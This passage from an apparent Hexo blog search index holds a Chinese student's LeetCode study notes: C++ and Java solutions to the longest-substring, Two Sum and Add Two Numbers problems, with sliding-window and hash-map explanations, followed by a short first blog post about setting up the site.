class="keyword">int</span> count = <span class="number">1</span>, max = <span class="number">0</span>, n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; s.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">        count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = n; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[j] != s[i]) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                max = max &gt; count ? max : count;</span><br><span class="line">                count = <span class="number">1</span>;</span><br><span class="line">                n = j + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        max = max &gt; count ? max : count;</span><br><span class="line">        <span class="keyword">if</span> (j == n) &#123;</span><br><span class="line">            max--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(s.<span class="built_in">length</span>() == <span class="number">1</span>) &#123;</span><br><span class="line">        max = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>4 ms</strong></p></li><li><p>内存消耗: <strong>6.8 MB</strong></p></li></ul><h3 id="官方答案">官方答案</h3><h4 id="滑动窗口">滑动窗口</h4><p>在官方题解中提到一种新的方法：<strong>滑动窗口</strong>。</p><blockquote><p>我们先用一个例子考虑如何在较优的时间复杂度内通过本题。</p><p>我们不妨以示例一中的字符串 abcabcbb 为例，找出从每一个字符开始的，不包含重复字符的最长子串，那么其中最长的那个字符串即为答案。对于示例一中的字符串，我们列举出这些结果，其中括号中表示选中的字符以及最长的字符串：</p><p>以 (a)bcabcbb 开始的最长字符串为 (abc)abcbb；<br>以 a(b)cabcbb 开始的最长字符串为 a(bca)bcbb；<br>以 ab©abcbb 开始的最长字符串为 ab(cab)cbb；<br>以 abc(a)bcbb 开始的最长字符串为 abc(abc)bb；<br>以 abca(b)cbb 开始的最长字符串为 abca(bc)bb；<br>以 abcab©bb 开始的最长字符串为 abcab(cb)b；<br>以 abcabc(b)b 开始的最长字符串为 abcabc(b)b；<br>以 abcabcb(b) 开始的最长字符串为 abcabcb(b)。<br>发现了什么？如果我们依次递增地枚举子串的起始位置，那么子串的结束位置也是递增的！这里的原因在于，假设我们选择字符串中的第 k 个字符作为起始位置，并且得到了不包含重复字符的最长子串的结束位置为 r_k。那么当我们选择第 k+1 个字符作为起始位置时，首先从 k+1 到 r_k 的字符显然是不重复的，并且由于少了原本的第 k 个字符，我们可以尝试继续增大 r_k，直到右侧出现了重复字符为止。</p><p>这样一来，我们就可以使用「滑动窗口」来解决这个问题了：</p><ul><li><p>我们使用两个指针表示字符串中的某个子串（或窗口）的左右边界，其中左指针代表着上文中「枚举子串的起始位置」，而右指针即为上文中的 r_k；</p></li><li><p>在每一步的操作中，我们会将左指针向右移动一格，表示 我们开始枚举下一个字符作为起始位置，然后我们可以不断地向右移动右指针，但需要保证这两个指针对应的子串中没有重复的字符。在移动结束后，这个子串就对应着 以左指针开始的，不包含重复字符的最长子串。我们记录下这个子串的长度；</p></li><li><p>在枚举结束后，我们找到的最长的子串的长度即为答案。</p></li></ul><p>作者：LeetCode-Solution</p></blockquote><p>因为涉及到哈希表，这里练习一下c++中哈希表的使用，用滑动窗口方法重写了一遍代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="keyword">char</span>&gt; osc;</span><br><span class="line">        <span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">-1</span>, Max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//erase函数删除表中指定元素</span></span><br><span class="line">                osc.<span class="built_in">erase</span>(s[i<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(h + <span class="number">1</span> &lt; len &amp;&amp; !osc.<span class="built_in">count</span>(s[h+<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="comment">//count函数统计字哈希表中某个元素出现的次数</span></span><br><span class="line">                <span class="comment">//insert函数在表中插入元素</span></span><br><span class="line">                osc.<span class="built_in">insert</span>(s[h+<span class="number">1</span>]);</span><br><span class="line">                h++;</span><br><span class="line">            &#125;</span><br><span class="line">            Max = <span class="built_in">max</span>(Max, h - i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>36 ms</strong></p></li><li><p>内存消耗: <strong>10.6 MB</strong></p></li></ul><p>讲道理，滑动窗口法跟我的死板破解法原理也差不了太多，但是这个方法一分析就是要丝滑好多，终究还是我小题大做方向错了。</p><p>惯例，用Java复习一遍：</p><p>（发现右索引标识为-1必要性貌似不大，这里试验了一下，貌似代码更简洁了，还是建议按照思路从-1开始，毕竟，咱是小白咱不懂咱也不敢多说。）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        Set&lt;Character&gt; hash = <span class="keyword">new</span> HashSet&lt;Character&gt;();</span><br><span class="line">        <span class="keyword">int</span> len = s.length();</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>, max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i != <span class="number">0</span>) &#123;</span><br><span class="line">                hash.remove(s.charAt(i - <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(h &lt; len &amp;&amp; !hash.contains(s.charAt(h))) &#123;</span><br><span class="line">                hash.add(s.charAt(h));</span><br><span class="line">                h++;</span><br><span class="line">            &#125;</span><br><span class="line">            max = max &gt; (h - i) ? max : (h - i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>5 ms</strong></p></li><li><p>内存消耗: <strong>38.4 MB</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> 刷题 </tag>
            
            <tag> 算法 </tag>
            
            <tag> Java </tag>
            
            <tag> C++ </tag>
            
            <tag> 哈希表 </tag>
            
            <tag> 滑动窗口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode 刷题笔记——day 1</title>
      <link href="/posts/bd6d9846/"/>
      <url>/posts/bd6d9846/</url>
      
        <content type="html"><![CDATA[<h1>LeetCode 刷题笔记——day 1</h1><h2 id="1-两数之和"><a href="https://leetcode-cn.com/problems/two-sum/">1. 两数之和</a></h2><p>难度：简单</p><p>给定一个整数数组 <code>nums</code> 和一个整数目标值 <code>target</code>，请你在该数组中找出 <strong>和为目标值</strong> <em><code>target</code></em> 的那 <strong>两个</strong> 整数，并返回它们的数组下标。</p><p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p><p>你可以按任意顺序返回答案。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [2,7,11,15], target = 9</span><br><span class="line">输出：[0,1]</span><br><span class="line">解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] 。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [3,2,4], target = 6</span><br><span class="line">输出：[1,2]</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [3,3], target = 6</span><br><span class="line">输出：[0,1]</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>2 &lt;= nums.length &lt;= 104</code></li><li><code>-109 &lt;= nums[i] &lt;= 109</code></li><li><code>-109 &lt;= target &lt;= 109</code></li><li><strong>只会存在一个有效答案</strong></li></ul><p><strong>进阶</strong>：你可以想出一个时间复杂度小于 <code>O(n2)</code> 的算法吗？</p><h3 id="我的答案-2">我的答案</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; len; j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] + nums[j] == target) &#123;</span><br><span class="line">          vector&lt;<span class="keyword">int</span>&gt; num = &#123;i, j&#125;; <span class="comment">//这里不需要新建一个vector&lt;int&gt;，直接return &#123;i， j&#125;即可。</span></span><br><span class="line">          <span class="keyword">return</span> num;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; num; <span class="comment">//这里不需要新建一个vector&lt;int&gt;，直接return &#123;&#125;即可。</span></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>264 ms</strong></p></li><li><p>内存消耗: <strong>9.9 MB</strong></p></li></ul><h3 id="官方答案-2">官方答案</h3><h4 id="哈希表法">哈希表法</h4><p>看过题解之后，学会了<strong>哈希表法</strong>，用Java重新写了一遍代码：</p><p><strong>思路</strong>：往哈希表中一次插入数组元素-数组索引组成的键值对，同时利用 <strong>containsKey</strong> 函数判断已有列表中是否存在与当前元素相加为 <strong>target</strong> 的<strong>键</strong>，由此可在一次循环以内完成目标。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; hashMap = <span class="keyword">new</span> HashMap&lt;Integer, Integer&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(hashMap.containsKey(target - nums[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;hashMap.get(target - nums[i]), i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashMap.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>2 ms</strong></p></li><li><p>内存消耗: <strong>38.7 MB</strong></p></li></ul><h2 id="2-两数相加"><a href="https://leetcode-cn.com/problems/add-two-numbers/">2. 两数相加</a></h2><p>难度：中等</p><p>给你两个 <strong>非空</strong> 的链表，表示两个非负的整数。它们每位数字都是按照 <strong>逆序</strong> 的方式存储的，并且每个节点只能存储 <strong>一位</strong> 数字。</p><p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p><p>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p><p><strong>示例 1：</strong></p><p><img src="addtwonumber1.jpg" alt="示例1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 = [2,4,3], l2 = [5,6,4]</span><br><span class="line">输出：[7,0,8]</span><br><span class="line">解释：342 + 465 = 807.</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 = [0], l2 = [0]</span><br><span class="line">输出：[0]</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 = [9,9,9,9,9,9,9], l2 = [9,9,9,9]</span><br><span class="line">输出：[8,9,9,9,0,0,0,1]</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li>每个链表中的节点数在范围 <code>[1, 100]</code> 内</li><li><code>0 &lt;= Node.val &lt;= 9</code></li><li>题目数据保证列表表示的数字不含前导零</li></ul><h3 id="我的答案-3">我的答案</h3><h3 id="官方答案-3">官方答案</h3><p>（在自己编写超过80行代码且半小时仍无法通过编译时毅然决然放弃了原来的硬方法，参考了官方题解之后才最终重新编写如下代码，是我配不上第二题了。）</p><blockquote><p><strong>思路</strong></p><p>创建两个空指针，一个指向头部，一个跟随程序指向尾部，利用三目运算符提取目标数字且在其一链表提前截止时以 <strong>0</strong> 赋值（必须加入 <strong>if 语句</strong>判断，切忌指针继续后移），将得到的数据处理后直接利用已有构造函数创建节点，同时指针跟随后移。最后输出头指针即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode* head = <span class="literal">nullptr</span>, *p = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l1 || l2) &#123;</span><br><span class="line">            <span class="keyword">int</span> n1 = l1 ? l1-&gt;val : <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> n2 = l2 ? l2-&gt;val : <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> sum = n1 + n2 + a;</span><br><span class="line">            a = sum / <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(!head) &#123;</span><br><span class="line">                head = p = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum%<span class="number">10</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                p-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum%<span class="number">10</span>);</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(l1) &#123;</span><br><span class="line">                l1 = l1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(l2) &#123;</span><br><span class="line">                l2 = l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            p-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>36 ms</strong></p></li><li><p>内存消耗: <strong>69.4 MB</strong></p></li></ul><p>拿 Java 练习一遍<strong>新学的算法：</strong></p><p><strong>思路</strong>：Java 没有指针概念，直接创建对象即可，思路同上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode head = <span class="keyword">new</span> ListNode();</span><br><span class="line">        ListNode p = head;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(l1 != <span class="keyword">null</span> || l2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> n1 = l1 == <span class="keyword">null</span> ? <span class="number">0</span> : l1.val;</span><br><span class="line">            <span class="keyword">int</span> n2 = l2 == <span class="keyword">null</span> ? <span class="number">0</span> : l2.val;</span><br><span class="line">            <span class="keyword">int</span> sum = n1 + n2 + a;</span><br><span class="line">            a = sum / <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">            p.next = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>);</span><br><span class="line">            p = p.next;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(l1 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                l1 = l1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(l2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                l2 = l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(a &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            p.next = <span class="keyword">new</span> ListNode(a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> head.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时：2 ms</p></li><li><p>内存消耗：38.8 MB</p></li></ul><blockquote><p><strong>总结</strong></p><p>第一天，刷了两题。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> 刷题 </tag>
            
            <tag> 算法 </tag>
            
            <tag> Java </tag>
            
            <tag> C++ </tag>
            
            <tag> 哈希表 </tag>
            
            <tag> 双指针 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156/"/>
      <url>/posts/4a17b156/</url>
      
        <content type="html"><![CDATA[<h1>Hello World</h1><p>​这是我自己的第一篇博客，同时，在看到这篇博客的地方，也是我的第一个正式启用的博客网站。</p><p>​学习搭建博客已经有很长一段时间了，学业繁忙，一直也没去打理，由于最近陆续会有考试，学业开始更加繁忙了，所以决定写写博客学学课外知识放松放松（误）。</p><p>​关于博客网站的搭建，由于学生党经费不足，本站目前采用 GitHub 配合 Hexo 的免费建站方案，待经济宽裕及博客技能成熟会迁移至个人服务器。博客的主要内容是我的学习笔记，有时会写一些教程，GitHub + Hexo 的建站教程也会在近日更新，后期还会在博客中存放我的收藏，若资金允许，也将添加流媒体。</p><p>​此外，博客中也建设了专门的板块，留给我的爱情。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
